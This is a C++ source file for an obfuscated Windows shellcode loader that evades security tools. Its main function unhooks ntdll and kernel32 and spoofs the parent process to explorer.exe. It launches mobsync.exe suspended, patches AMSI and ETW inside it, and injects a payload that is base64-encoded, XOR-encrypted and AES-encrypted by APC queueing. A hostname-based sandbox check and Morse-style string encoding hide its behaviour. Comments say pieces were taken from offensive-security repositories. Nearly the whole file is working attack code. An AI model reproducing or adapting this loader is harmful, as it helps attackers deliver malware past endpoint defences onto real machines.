#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <psapi.h>
#include <vector>
#include "aes.hpp"
#include "base64.h"
#include "low.h"
#include <string>
#include "helpers.h"
#include <map>
#include <sstream>
#include <numeric>

typedef BOOL(WINAPI* VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE(WINAPI* CreateFileMappingA_t)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
typedef HANDLE(WINAPI* OpenProcess_t)(DWORD, BOOL, DWORD);
typedef DWORD(WINAPI* WaitForSingleObject_t)(HANDLE, DWORD);
typedef HANDLE(WINAPI* GetCurrentProcess_t)();
typedef LPVOID(WINAPI* MapViewOfFile_t)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
typedef BOOL(WINAPI* UnmapViewOfFile_t)(LPCVOID);
VirtualProtect_t avqudainxnav = NULL;

using namespace std;

map< char, string > grshlgyx =
{
{'a',".-"},{'A',"^.-"},{'b',"-..."},{'B',"^-..."},{'c',"-.-."},{'C',"^-.-."},{'d',"-.."},{'D',"^-.."},{'e',"."},{'E',"^."},{'f',"..-."},{'F',"^..-."},{'g',"--."},{'G',"^--."},{'h',"...."},{'H',"^...."},{'i',".."},{'I',"^.."},{'j',".---"},{'J',"^.---"},{'k',"-.-"},{'K',"^-.-"},{'l',".-.."},{'L',"^.-.."},{'m',"--"},{'M',"^--"},{'n',"-."},{'N',"^-."},{'o',"---"},{'O',"^---"},{'p',".--."},{'P',"^.--."},{'q',"--.-"},{'Q',"^--.-"},{'r',".-."},{'R',"^.-."},{'s',"..."},{'S',"^..."},{'t',"-"},{'T',"^-"},{'u',"..-"},{'U',"^..-"},{'v',"...-"},{'V',"^...-"},{'w',".--"},{'W',"^.--"},{'x',"-..-"},{'X',"^-..-"},{'y',"-.--"},{'Y',"^-.--"},{'z',"--.."},{'Z',"^--.."},{'0',"-----"},{'1',".----"},{'2',"..---"},{'3',"...--"},{'4',"....-"},{'5',"....."},{'6',"-...."},{'7',"--..."},{'8',"---.."},{'9',"----."},{'/',"/"},{'=',"...^-"},{'+',"^.^"},{'!',"^..^"},{'.',"^^^.__-"},
};

void qqugxtsgkeg(std::string const& str, const char udrdlefyvwebed,
    std::vector<std::string>& out)
{
    // construct a stream from the string
    std::stringstream ss(str);

    std::string s;
    while (std::getline(ss, s, udrdlefyvwebed)) {
        out.push_back(s);
    }
}

string okeqkmqen(string asuctypwm)
{
    string chhnquql;

    //morse to ascii
    std::vector<std::string> csbiwngycus;
    qqugxtsgkeg(asuctypwm, ' ', csbiwngycus);
    for (int s = 0; s < csbiwngycus.size(); s++) {
        for (auto it = grshlgyx.rbegin(); it != grshlgyx.rend(); it++) {
            if (csbiwngycus[s] == it->second)
            {
                chhnquql.push_back(it->first);
            }
        }
    }
    return chhnquql;
}

// This is just directly stolen from ired.team
DWORD dtlahimhrvfelu() {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process = { 0 };
    process.dwSize = sizeof(process);

    if (Process32First(snapshot, &process)) {
        do {
            if (!wcscmp(process.szExeFile, L"explorer.exe"))
                break;
        } while (Process32Next(snapshot, &process));
    }

    CloseHandle(snapshot);
    return process.th32ProcessID;
}

//code stolen from https://github.com/Hagrid29/RemotePatcher/blob/main/RemotePatcher/RemotePatcher.cpp
void uxmjsdlk(OUT HANDLE& hProc) {

    LPSTR s = const_cast<char*>(okeqkmqen(".- -- ... .. ^^^.__- -.. .-.. .-..").c_str());
    LPSTR l = const_cast<char*>(okeqkmqen("^.- -- ... .. ^... -.-. .- -. ^-... ..- ..-. ..-. . .-.").c_str());
    void* uwgxomeu = GetProcAddress(LoadLibraryA(s), l);

    char kxjhllobpidwnh[] = { 0x31, 0xC0, 0x05, 0x4E, 0xFE, 0xFD, 0x7D, 0x05, 0x09, 0x02, 0x09, 0x02, 0xC3 };

    DWORD lpflOldProtect = 0;
    unsigned __int64 memPage = 0x1000;
    void* uwgxomeu_bk = uwgxomeu;


    NtProtectVirtualMemory(hProc, (PVOID*)&uwgxomeu_bk, (PSIZE_T)&memPage, 0x04, &lpflOldProtect);
    NtWriteVirtualMemory(hProc, (LPVOID)uwgxomeu, (PVOID)kxjhllobpidwnh, sizeof(kxjhllobpidwnh), (SIZE_T*)nullptr);
    NtProtectVirtualMemory(hProc, (PVOID*)&uwgxomeu_bk, (PSIZE_T)&memPage, lpflOldProtect, &lpflOldProtect);
    //std::cout << "[+] Patched amsi!\n";
}

//code stolen from https://github.com/Hagrid29/RemotePatcher/blob/main/RemotePatcher/RemotePatcher.cpp
void uxmjsdlkOpenSession(OUT HANDLE& hProc) {

    LPSTR s = const_cast<char*>(okeqkmqen(".- -- ... .. ^^^.__- -.. .-.. .-..").c_str());
    LPSTR l = const_cast<char*>(okeqkmqen("^.- -- ... .. ^--- .--. . -. ^... . ... ... .. --- -.").c_str());
    void* uwgxomeu = GetProcAddress(LoadLibraryA(s), l);

    char kxjhllobpidwnh[] = { 0x48, 0x31, 0xC0 };

    DWORD lpflOldProtect = 0;
    unsigned __int64 memPage = 0x1000;
    void* uwgxomeu_bk = uwgxomeu;


    NtProtectVirtualMemory(hProc, (PVOID*)&uwgxomeu_bk, (PSIZE_T)&memPage, 0x04, &lpflOldProtect);
    NtWriteVirtualMemory(hProc, (LPVOID)uwgxomeu, (PVOID)kxjhllobpidwnh, sizeof(kxjhllobpidwnh), (SIZE_T*)nullptr);
    NtProtectVirtualMemory(hProc, (PVOID*)&uwgxomeu_bk, (PSIZE_T)&memPage, lpflOldProtect, &lpflOldProtect);
    //std::cout << "[+] Patched amsi open session!\n";
}

//code stolen from https://github.com/Hagrid29/RemotePatcher/blob/main/RemotePatcher/RemotePatcher.cpp
void npashsaqm(OUT HANDLE& hProc) {
    LPSTR s = const_cast<char*>(okeqkmqen("-. - -.. .-.. .-.. ^^^.__- -.. .-.. .-..").c_str());
    LPSTR l = const_cast<char*>(okeqkmqen("^ . - .-- ^ . ... - . - . - ^ .-- . - . .. - .").c_str());
    void* idiohsrjh = GetProcAddress(GetModuleHandle((LPCTSTR)s), l);

    char dgpmovvnvk[] = { 0xC3 };

    DWORD lpflOldProtect = 0;
    unsigned __int64 memPage = 0x1000;
    void* idiohsrjh_bk = idiohsrjh;
    NtProtectVirtualMemory(hProc, (PVOID*)&idiohsrjh_bk, (PSIZE_T)&memPage, 0x04, &lpflOldProtect);
    NtWriteVirtualMemory(hProc, (LPVOID)idiohsrjh, (PVOID)dgpmovvnvk, sizeof(dgpmovvnvk), (SIZE_T*)nullptr);
    NtProtectVirtualMemory(hProc, (PVOID*)&idiohsrjh_bk, (PSIZE_T)&memPage, lpflOldProtect, &lpflOldProtect);
    //std::cout << "[+] Patched etw!\n";

}

//reffered to alaris
void yacdxqavxr(std::vector<byte> rabagwdrvgrbg)
{
    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    LPVOID mem;
    HANDLE hProcess, hThread;
    DWORD xvgmxvqi;
    DWORD yvlvbeqsg;
    PULONG dwOld = 0;

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    SIZE_T size = 0;

    // Initialize custom startup objects for CreateProcess()
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;
    InitializeProcThreadAttributeList(NULL, 2, 0, &size);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);

    // Disallow non-microsoft signed DLL's from hooking/injecting into our CreateProcess():
    InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, &size);
    DWORD64 cqvvqnuuir = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &cqvvqnuuir, sizeof(cqvvqnuuir), NULL, NULL);

    // Mask the PPID to that of explorer.exe
    OpenProcess_t vhdbswqggyy = (OpenProcess_t)hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), (char*)"OpenProcess");
    HANDLE gbqutbahabtlm = vhdbswqggyy(PROCESS_ALL_ACCESS, false, dtlahimhrvfelu());
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &gbqutbahabtlm, sizeof(HANDLE), NULL, NULL);

    LPCWSTR kdrrqfuyiq = L"C:\\Windows\\System32\\mobsync.exe";

    if (!CreateProcess(
        kdrrqfuyiq,                 // LPCWSTR Command (Binary to Execute)
        NULL,                               // Command line
        NULL,                               // Process handle not inheritable
        NULL,                               // Thread handle not inheritable
        FALSE,                              // Set handle inheritance to FALSE
        EXTENDED_STARTUPINFO_PRESENT
        | CREATE_NO_WINDOW
        | CREATE_SUSPENDED, // Creation Flags
        NULL,                               // Use parent's environment block
        NULL,                               // Use parent's starting directory
        (LPSTARTUPINFOW)&si,// Pointer to STARTUPINFO structure
        &pi                                 // Pointer to PROCESS_INFORMATION structure (removed extra parentheses)
    )) {
        DWORD errval = GetLastError();
        std::cout << "whoops " << errval << std::endl;
    }

    WaitForSingleObject_t WaitForSingleObject_p = (WaitForSingleObject_t)hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), (char*)"WaitForSingleObject");
    WaitForSingleObject_p(pi.hProcess, 1400);
    hProcess = pi.hProcess;
    hThread = pi.hThread;

    mem = nullptr;
    SIZE_T ifjogjdcr = rabagwdrvgrbg.size();

    //patch AMSI and ETW before anything else
    uxmjsdlk(hProcess);
    uxmjsdlkOpenSession(hProcess);
    npashsaqm(hProcess);

    NtAllocateVirtualMemory(hProcess, &mem, 0, (PSIZE_T)&ifjogjdcr, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    //std::cout << "Written to " << mem << std::endl;
    NtWriteVirtualMemory(hProcess, mem, rabagwdrvgrbg.data(), rabagwdrvgrbg.size(), 0);
    // will be implemented soon
    // VirtualProtect(mem, (size_t)ifjogjdcr, 0x20, MEM_COMMIT | MEM_RESERVE);
    //NtProtectVirtualMemory(hProcess, mem , (PSIZE_T)&ifjogjdcr, PAGE_EXECUTE_READ, dwOld);
    NtQueueApcThread(hThread, (PKNORMAL_ROUTINE)mem, mem, NULL, NULL);
    NtResumeThread(hThread, NULL);

    // Overwrite shellcode with null bytes
    Sleep(9999);
    uint8_t ahsyruftube[500];
    NtWriteVirtualMemory(hProcess, mem, ahsyruftube, sizeof(ahsyruftube), 0);
}

std::string XOR(std::string brpjuwslwmmtr, std::string yufjgprmrlp)
{
    char uxitttmmnhgj[19];
    for (int k = 0; k < yufjgprmrlp.length(); k++) uxitttmmnhgj[k] = yufjgprmrlp[k];

    int j = 0;
    for (int i = 0; i < brpjuwslwmmtr.size(); i++) {
        if (j == sizeof uxitttmmnhgj - 1) j = 0;

        brpjuwslwmmtr[i] = brpjuwslwmmtr[i] ^ uxitttmmnhgj[j];
        j++;
    }
    return brpjuwslwmmtr;
}

void oobigdqu(char* xbdpjebbfepj, char* oriModulePath, const char* moduleName, HANDLE process) {
    MODULEINFO mi = {};
    HMODULE lmarqnrquutm = GetModuleHandleA(moduleName);
    lstrcatA(xbdpjebbfepj, moduleName);

    GetModuleInformation(process, lmarqnrquutm, &mi, sizeof(mi));
    LPVOID ewkceiqappaebi = (LPVOID)mi.lpBaseOfDll;
    HANDLE wsjwltrto = CreateFileA(xbdpjebbfepj, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    HANDLE whevaolpevkyx = CreateFileMapping(wsjwltrto, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    LPVOID whevaolpevkyxAddress = MapViewOfFile(whevaolpevkyx, FILE_MAP_READ, 0, 0, 0);

    PIMAGE_DOS_HEADER ktckvadmd = (PIMAGE_DOS_HEADER)ewkceiqappaebi;
    PIMAGE_NT_HEADERS ghalepbnnwmvx = (PIMAGE_NT_HEADERS)((DWORD_PTR)ewkceiqappaebi + ktckvadmd->e_lfanew);

    //cout << "[REFRESH] Copying PE sections into memory " << xbdpjebbfepj << endl;
    for (WORD i = 0; i < ghalepbnnwmvx->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER hthfuvohhbtcw = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(ghalepbnnwmvx) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

        if (!strcmp((char*)hthfuvohhbtcw->Name, (char*)".text")) {
            DWORD oldProtection = 0;
            bool isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ewkceiqappaebi + (DWORD_PTR)hthfuvohhbtcw->VirtualAddress), hthfuvohhbtcw->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
            memcpy((LPVOID)((DWORD_PTR)ewkceiqappaebi + (DWORD_PTR)hthfuvohhbtcw->VirtualAddress), (LPVOID)((DWORD_PTR)whevaolpevkyxAddress + (DWORD_PTR)hthfuvohhbtcw->VirtualAddress), hthfuvohhbtcw->Misc.VirtualSize);
            isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ewkceiqappaebi + (DWORD_PTR)hthfuvohhbtcw->VirtualAddress), hthfuvohhbtcw->Misc.VirtualSize, oldProtection, &oldProtection);
        }
    }

    // this would still require a PE relocation but will do this later
    // ----
    // Step 3: Calculate relocations
    // ----
    // refer here https://github.com/rsmudge/oobigdqu-bof/blob/master/src/refresh.c

    memset(xbdpjebbfepj, 0, strlen(xbdpjebbfepj));
    memcpy(xbdpjebbfepj, oriModulePath, strlen(oriModulePath));
    CloseHandle(process);
    CloseHandle(wsjwltrto);
    CloseHandle(whevaolpevkyx);
    FreeLibrary(lmarqnrquutm);
}

//code stolen from https://github.com/D1rkMtr/DumpThatLSASS/blob/main/MiniDump/Source.cpp
static int kucwkcrkoxmr(const HMODULE hDbghelp, const LPVOID pMapping) {
    /*
        UnhookDbghelp() finds .text segment of fresh loaded copy of Dbghelp.dll and copies over the hooked one
    */
    DWORD nmbcmisrhek = 0;
    PIMAGE_DOS_HEADER xvgmxvqih = (PIMAGE_DOS_HEADER)pMapping;
    PIMAGE_NT_HEADERS kadwdfjdqxv = (PIMAGE_NT_HEADERS)((DWORD_PTR)pMapping + xvgmxvqih->e_lfanew);
    int i;


    // find .text section
    for (i = 0; i < kadwdfjdqxv->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER drbquqakmp = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(kadwdfjdqxv) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

        if (!strcmp((char*)drbquqakmp->Name, ".text")) {
            // prepare hDbghelp.dll memory region for write permissions.
            avqudainxnav((LPVOID)((DWORD_PTR)hDbghelp + (DWORD_PTR)drbquqakmp->VirtualAddress), drbquqakmp->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &nmbcmisrhek);
            if (!nmbcmisrhek) {
                // RWX failed!
                return -1;
            }
            // copy original .text section into hDbghelp memory
            memcpy((LPVOID)((DWORD_PTR)hDbghelp + (DWORD_PTR)drbquqakmp->VirtualAddress), (LPVOID)((DWORD_PTR)pMapping + (DWORD_PTR)drbquqakmp->VirtualAddress), drbquqakmp->Misc.VirtualSize);

            // restore original protection settings of hDbghelp
            avqudainxnav((LPVOID)((DWORD_PTR)hDbghelp + (DWORD_PTR)drbquqakmp->VirtualAddress), drbquqakmp->Misc.VirtualSize, nmbcmisrhek, &nmbcmisrhek);
            if (!nmbcmisrhek) {
                // it failed
                return -1;
            }
            // all is good, time to go home
            return 0;
        }
    }
    // .text section not found?
    return -1;
}

//code stolen from https://github.com/D1rkMtr/DumpThatLSASS/blob/main/MiniDump/Source.cpp
void rkgumxrs(LPCWSTR lKernel32, unsigned char* xbdpjebbfepj, LPCWSTR moduleName) {
    char sCreateFileMappingA[] = { 'C','r','e','a','t','e','F','i','l','e','M','a','p','p','i','n','g','A', 0x0 };
    char sMapViewOfFile[] = { 'M','a','p','V','i','e','w','O','f','F','i','l','e',0x0 };
    char sUnmapViewOfFile[] = { 'U','n','m','a','p','V','i','e','w','O','f','F','i','l','e', 0x0 };
    char sVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };

    int ret = 0;
    HANDLE hFile;
    HANDLE hFileMapping;
    LPVOID pMapping;

    CreateFileMappingA_t vhdbswqggyy = (CreateFileMappingA_t)hlpGetProcAddress(hlpGetModuleHandle(lKernel32), sCreateFileMappingA);
    MapViewOfFile_t rbrwxxvdotdmro = (MapViewOfFile_t)hlpGetProcAddress(hlpGetModuleHandle(lKernel32), sMapViewOfFile);
    UnmapViewOfFile_t oabiphgfoamvd = (UnmapViewOfFile_t)hlpGetProcAddress(hlpGetModuleHandle(lKernel32), sUnmapViewOfFile);
    avqudainxnav = (VirtualProtect_t)hlpGetProcAddress(hlpGetModuleHandle(lKernel32), sVirtualProtect);

    // open the DLL
    hFile = CreateFileA((LPCSTR)xbdpjebbfepj, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        // failed to open the DLL
        printf("%u", GetLastError());
    }

    // prepare file mapping
    hFileMapping = vhdbswqggyy(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hFileMapping) {
        // file mapping failed

        CloseHandle(hFile);
        printf("%u", GetLastError());
    }

    // map the bastard
    pMapping = rbrwxxvdotdmro(hFileMapping, FILE_MAP_READ, 0, 0, 0);
    if (!pMapping) {
        // mapping failed
        CloseHandle(hFileMapping);
        CloseHandle(hFile);
        printf("%u", GetLastError());
    }

    // remove hooks
    ret = kucwkcrkoxmr(hlpGetModuleHandle(moduleName), pMapping);

    // Clean up.
    oabiphgfoamvd(pMapping);
    CloseHandle(hFileMapping);
    CloseHandle(hFile);
}

int main()
{
    //oobigdqu all dlls
    GetCurrentProcess_t GetCurrentProcess_p = (GetCurrentProcess_t)hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), (char*)"GetCurrentProcess");
    HANDLE process = GetCurrentProcess_p();
    //char fullModulePath[21];
    //char xbdpjebbfepj[] = { 'c',':','\\','w','i','n','d','o','w','s','\\','s','y','s','t','e','m','3','2','\\',0 };
    //memcpy(fullModulePath, xbdpjebbfepj, strlen(xbdpjebbfepj));

    //oobigdqu(fullModulePath, xbdpjebbfepj, "ntdll.dll", process);
    //oobigdqu(fullModulePath, xbdpjebbfepj, "kernel32.dll", process);

    unsigned char sNtdllPath[] = { 'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','n','t','d','l','l','.','d','l','l',0 };
    unsigned char sKernel32Path[] = { 'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','k','e','r','n','e','l','3','2','.','d','l','l',0 };
    unsigned char sKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };
    LPCWSTR lKernel32 = L"KERNEL32.dll";
    LPCWSTR lNtdll = L"ntdll.dll";
    unsigned char sNtdll[] = { 'n','t','d','l','l','.','d','l','l', 0x0 };

    rkgumxrs(lKernel32, sNtdllPath, lNtdll);
    rkgumxrs(lKernel32, sKernel32Path, lKernel32);

    // Disallow non-MSFT signed DLL's from injecting
    PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY sp = {};
    sp.MicrosoftSignedOnly = 1;
    SetProcessMitigationPolicy(ProcessSignaturePolicy, &sp, sizeof(sp));

    std::vector<uint8_t> wwvgqttuswa, rabagwdrvgrbg;
    BOOL hugeCode = 0;
    std::string asuctypwm, pjnyxvwnpgaw, brpjuwslwmmtr, arxgbjntxxj, svqwjfdytkdp, asuctypwmarxgbjntxxj, asuctypwmsvqwjfdytkdp, asuctypwmyufjgprmrlp, yufjgprmrlp;
    base64 b64 = base64();

    //xor
    asuctypwm = "..- .-.. --. ..--- ^.-- ^.--- ..- ^. -.- --.- ^.. ^-..- ^--.- .. -.-. ....- .--. --- - ...- ^. -... ..-. ^--. .-- ....- ^.--- .-- .--- ---.. ^..-. ^.... ^.. .--- .---- ^.-- -... ^.^ ^-.-- .- -- ^.... ..--- ^--. ^.- ^.^ ^...- ^-..- --.. ^...- .--. -... ^.-. -.-- ..-. ....- ----. ^.... - ... .-. ^... ^... ^--. ^-.- ---.. ^-... -.-- .- ^..- ^. ..... ^-.-- ---.. ...-- -.-- .-.. ^-. - -... ^--- ...- -.. ^.-- -... . ^- ^-- -... ..- ----. .. ^-.. ^..-. ---.. .-- ^-.- --.- ^-.- ^.--. -- ^... ^--.- -. ---.. ^- -.. ---.. -. --.. -- -..- ^-- ^.--. ...-- ^.... --... .... --... ..-. ^.--- ..- -.... ----- ^.-.. ^.. ^--.- ^-.. ^...- ^--. .... .--. ...- -..- ^.-. ^.--- .... ^-.-. ..- --. .. ^.-.. ^.--- ^- -..- .-- ^- ^-.. ^--- -... ^..- ^--- ..--- .-.. ^--- -.. --- --. --... ^-... ..- ..--- -.... ---.. .. -.-. ...-- ^.--- ^- ^-.-- ^..-. ^..- ^... ^--.. ... -. ^.-.. ^...- -..- -. ^-.- ^... . ^.^ ^-.-- ^.. --. --.- -.-. ..... -.-. ^-..- ^.... .--- .-- ..- .--. -... .--- ^-..- -.. ^-.- -.. --.. ^..-. .-- ..--- ..... ^...- ^-- ...- --... ^..- ...-- ..--- ..--- / ^--.- ^-- ^--.- ..- .--. --.- ...-- -.-- ^-.-- .... ..- ^- ^-.-. --.. .--- .-- ..... ..- .---- ..-. ..- .- ..-. ^.--. ^.--- ^--.. ----- / --. ^--.. .. -. ....- ^- .-. ... -..- ^-.. ^..- .... ^- .--. ^.. -- ^.. .. ^.-. ^.-- ^-- ^.-.. ^.- --- ^--.. ^-.. ^.--- ^-.- ^.^ ----- .---- ^.-. ^... ..-. ^.. .--- ..-. .-- ^.- ^-. -.-- ----. .. ^... --.- ^. ..-. ^--.- -- ^.-- ----. ^.--- -.-- ^.--- ^- -..- .-.. ^.-- ^-.-- .-- ^--.- ^-.- ^-. ^.--- ^-..- ^--. ^--- ^. ^..-. ^--.. .-. ^. .-- ^--. ----. ^. . ^--.. ^... ^--. .-.. - / .- .-.. .- ^.--. ^-.. -.-- ...-- ^.-.. ^--. -. ... - ^.-. --.. ..- ^.--- -- ... / ^.-. -.. -.... ^-..- -... ..-. --. ...-- ^.^ ... .--- .-- ..... . ^-.. ..-. .. ^..- ^--- ^..-. ---.. ^. --. -..- ----. ^-.- ..-. ^-. --.- ^-.-. ^-.-- ..--- .-. ^-.. -- --- ..... ";
    asuctypwmarxgbjntxxj = "..-. ^.. --... ...-- -... ... -.- -... ----. .--. -.... -.- ...-- ^--- -..- ---.. -.-- -.-- -- ^-.-- ^-.- ^.-. --.. ^--.- ^-- -. -.- ....- ^- -- ^.-. ^--- ...-- ^-.. ...- .---- ^.- .-.. ^.-. -.... ^-.-- .-. ^-.-- ...^- ";
    asuctypwmsvqwjfdytkdp = "--... ^--.. ..- ^-.-- ^-. .---- .- ^. ^.... -.-- ^.--. -.- .-. ^-- ----. ^...- ----- ^- ^..-. ^.... --... ^.- ...^- ...^- ";
    asuctypwmyufjgprmrlp = ".-. ^..^ ^-... -. .... ^--.. ^-... ^.--. ^.--- ^..^ ^.--. ^- -.- ^...- ^.^ .... ^.-- -.-- ";

    //translate all sumarine language
    pjnyxvwnpgaw = okeqkmqen(asuctypwm);
    arxgbjntxxj = okeqkmqen(asuctypwmarxgbjntxxj);
    svqwjfdytkdp = okeqkmqen(asuctypwmsvqwjfdytkdp);
    yufjgprmrlp = okeqkmqen(asuctypwmyufjgprmrlp);

    // sandbox check
    string strHostname;
    char name[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(name);
    GetComputerNameA(name, &size);

    for (char character : name) strHostname.push_back(character);
    if (strHostname.find("CHANGESTRINGHERE") != std::string::npos) {
        //std::cout << "hit" << std::endl;
        yufjgprmrlp.replace(0, 1, "~");
    }

    /*
    if (strcmp(name, "DESKTOP-H39OG3S") == 0) {
        std::cout << "Sandbox hit" << std::endl;
        yufjgprmrlp.replace(0, 1, "P");
    }
    */

    brpjuwslwmmtr = b64.base64_decode(pjnyxvwnpgaw);

    //xor is already in its own function
    //char uxitttmmnhgj[] = "Sup3rS3cur3K3yfTw!";
    //initialize yufjgprmrlp in a weird way
    /*
    char uxitttmmnhgj[19];
    for (int k = 0; k < yufjgprmrlp.length(); k++) uxitttmmnhgj[k] = yufjgprmrlp[k];

    int j = 0;
    for (int i = 0; i < brpjuwslwmmtr.size(); i++) {
        if (j == sizeof uxitttmmnhgj - 1) j = 0;

        brpjuwslwmmtr[i] = brpjuwslwmmtr[i] ^ uxitttmmnhgj[j];
        j++;
    }
    */
    brpjuwslwmmtr = XOR(brpjuwslwmmtr, yufjgprmrlp);

    if (!hugeCode)
    {
        wwvgqttuswa.clear();
        std::copy(brpjuwslwmmtr.begin(), brpjuwslwmmtr.end(), std::back_inserter(wwvgqttuswa));

        // AES Decryption Objects
        struct AES_ctx e_ctx;
        uint8_t key[32];
        uint8_t iv[16];
        string a3s_key = b64.base64_decode(arxgbjntxxj);
        string a3s_iv = b64.base64_decode(svqwjfdytkdp);
        std::copy(a3s_key.begin(), a3s_key.end(), std::begin(key));
        std::copy(a3s_iv.begin(), a3s_iv.end(), std::begin(iv));

        AES_init_ctx_iv(&e_ctx, key, iv);

        // DECRYPT
        struct AES_ctx d_ctx;
        AES_init_ctx_iv(&d_ctx, key, iv);
        AES_CBC_decrypt_buffer(&d_ctx, wwvgqttuswa.data(), wwvgqttuswa.size());
        rabagwdrvgrbg.clear();

        // Remove the padding from the decypted plaintext
        SIZE_T c_size = wwvgqttuswa.size();
        for (int i = 0; i < c_size; i++)
        {
            if (wwvgqttuswa[i] == 0x90 && i == (c_size - 1))
            {
                break;
            }
            else if (wwvgqttuswa[i] == 0x90 && wwvgqttuswa[i + 1] == 0x90)
            {
                break;
            }
            else
            {
                rabagwdrvgrbg.push_back(wwvgqttuswa[i]);
            }
        }
    }
    else
    {
        rabagwdrvgrbg.clear();
        std::copy(brpjuwslwmmtr.begin(), brpjuwslwmmtr.end(), std::back_inserter(rabagwdrvgrbg));
    }

    //process hollowing + pxvgmxvqi spoofing
    yacdxqavxr(rabagwdrvgrbg);
}